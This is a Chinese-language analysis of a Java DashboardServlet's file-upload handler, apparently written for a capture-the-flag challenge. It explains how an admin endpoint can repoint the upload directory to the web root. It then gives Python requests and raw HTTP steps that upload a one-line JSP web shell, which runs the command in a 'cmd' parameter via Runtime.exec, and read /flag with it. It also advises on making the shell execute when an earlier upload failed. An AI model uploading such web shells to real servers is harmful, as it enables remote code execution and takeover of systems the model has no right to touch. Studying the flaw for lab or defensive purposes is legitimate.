# DashboardServlet 上传功能分析

## 上传实现关键代码

```java
private void uploadFile(HttpServletRequest req, HttpServletResponse resp) {
    // 1. 获取上传的文件
    Part filePart = req.getPart("file");
    
    // 2. 获取基础目录 - 注意这里使用了 AdminDashboardServlet.resourceDir!
    File baseDir = new File(
        getServletContext().getRealPath(AdminDashboardServlet.resourceDir)
    ).getCanonicalFile();
    
    // 3. 获取提交的文件名
    String submittedFileName = filePart.getSubmittedFileName();
    
    // 4. 创建目标文件路径
    File targetFile = new File(baseDir, submittedFileName).getCanonicalFile();
    
    // 5. 路径验证 - 检查目标文件是否在baseDir内
    if (!targetFile.getParentFile().toPath().startsWith(baseDir.toPath())) {
        return error("invalid path");
    }
    
    // 6. 写入文件
    try (InputStream in = filePart.getInputStream();
         OutputStream out = Files.newOutputStream(targetFile.toPath())) {
        in.transferTo(out);
    }
}
```

## 关键发现

### 1. resourceDir 可控！
```java
File baseDir = new File(
    getServletContext().getRealPath(AdminDashboardServlet.resourceDir)
).getCanonicalFile();
```

**DashboardServlet的上传目录基于 `AdminDashboardServlet.resourceDir`**！

这意味着：
- 默认情况下 `resourceDir = "uploads"`
- 通过 `/admin/challengeResourceDir` 可以修改这个值
- **修改后，上传的文件会保存到新的目录！**

### 2. 文件名直接来自客户端
```java
String submittedFileName = filePart.getSubmittedFileName();
```

**submittedFileName 是客户端在 multipart/form-data 中的 filename 参数**！

### 3. 路径验证
```java
if (!targetFile.getParentFile().toPath().startsWith(baseDir.toPath())) {
    return error("invalid path");
}
```

验证逻辑：
- `targetFile` = `baseDir` + `submittedFileName`
- 使用 `getCanonicalFile()` 规范化路径
- 检查父目录是否在 baseDir 内

**问题**：只检查了父目录，不是文件本身！

## 任意文件上传的方法

### 方法1: 修改 resourceDir (已实现)
```python
# 1. 修改上传目录
session.post(f"{BASE_URL}/admin/challengeResourceDir", 
             data={"new-path": "/"})

# 2. 上传文件到根目录
files = {'file': ('evil.jsp', jsp_content)}
session.post(f"{BASE_URL}/dashboard/upload", files=files)
```

### 方法2: 文件名中的路径遍历 (可能被阻止)
```python
# 尝试在文件名中使用路径遍历
files = {'file': ('../shell.jsp', jsp_content)}
```

但是 `getCanonicalFile()` 会规范化路径，`..` 会被解析。

### 方法3: 组合使用
```python
# 1. 设置 resourceDir = ""（空字符串，指向webapp根目录）
# 2. 上传 JSP 文件到根目录
# 3. 直接访问 http://target/evil.jsp
```

## 为什么你的 JSP 没执行？

你之前上传的 JSP 在 `/uploads/` 目录下可能：
1. Apache Rewrite 规则阻止了直接访问
2. uploads 目录被配置为不执行脚本

**解决方法**：上传到根目录或其他可执行目录！

## 实际利用

```python
# 1. 修改 resourceDir 为空（webapp根目录）
POST /admin/challengeResourceDir
new-path=

# 2. 上传 webshell 到根目录
POST /dashboard/upload
Content-Type: multipart/form-data
file=shell.jsp (内容: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>)

# 3. 访问 webshell
GET /shell.jsp?cmd=cat /flag
```

